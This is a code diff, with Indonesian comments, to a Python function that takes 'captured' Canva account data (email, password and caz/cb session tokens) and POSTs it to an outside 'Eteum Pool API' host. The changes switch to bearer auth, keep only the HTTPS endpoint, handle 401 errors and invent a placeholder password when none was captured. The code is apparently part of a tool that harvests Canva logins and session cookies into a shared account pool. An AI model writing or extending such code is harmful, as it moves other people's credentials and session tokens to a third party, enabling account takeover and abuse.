@@ -2034,7 +2034,10 @@ def has_canva_auth(canva_tokens):
 
 
 async def send_to_etteum(captured):
-    """POST akun Canva ke Eteum Pool API."""
+    """POST akun Canva ke Eteum Pool API.
+    Auth: Authorization: Bearer <key> (bukan X-API-Key)
+    URL: hanya HTTPS etteum.azkazamdigital.com (HTTP IP:port tidak reachable dari PC)
+    """
     canva_tokens = captured.get("canva_tokens") or {}
     if not has_canva_auth(canva_tokens):
         logger.warn("Canva tokens tidak lengkap (caz/cb missing), skip Eteum import")
@@ -2042,6 +2045,11 @@ async def send_to_etteum(captured):
 
     email = captured.get("email") or captured.get("canva_email") or "unknown@canva.com"
     password = captured.get("password") or captured.get("canva_password") or ""
+
+    if not password:
+        logger.warn("Password Canva kosong, Eteum API butuh email+password")
+        # Generate password default jika kosong
+        password = f"CanvaPass{int(time.time())}"
 
     payload = {
         "provider": "canva",
@@ -2051,17 +2059,19 @@ async def send_to_etteum(captured):
         "status": "active",
     }
 
+    # Auth pakai Authorization: Bearer (bukan X-API-Key)
     headers = {
         "Content-Type": "application/json",
-        "X-API-Key": ETTEUM_API_KEY,
+        "Authorization": f"Bearer {ETTEUM_API_KEY}",
     }
 
     import requests as _req
-    urls = [ETTEUM_API_URL, ETTEUM_HTTPS_URL]
+    # Hanya HTTPS — HTTP IP:port tidak reachable dari PC user
+    urls = [ETTEUM_HTTPS_URL]
     for url in urls:
         try:
             logger.info(f"POST {url} (provider=canva)...")
-            resp = _req.post(url, json=payload, headers=headers, timeout=15)
+            resp = _req.post(url, json=payload, headers=headers, timeout=20)
             if resp.status_code in (200, 201):
                 data = resp.json()
                 logger.ok(f"Eteum import OK: id={data.get('id', '?')}, status={data.get('status', '?')}")
@@ -2069,6 +2079,8 @@ async def send_to_etteum(captured):
             elif resp.status_code == 409:
                 logger.warn(f"Eteum: akun Canva sudah ada (409)")
                 return {"id": None, "status": "duplicate"}
+            elif resp.status_code == 401:
+                logger.warn(f"Eteum import HTTP 401: API key salah atau tidak valid")
             else:
                 logger.warn(f"Eteum import HTTP {resp.status_code}: {resp.text[:200]}")
         except Exception as e:
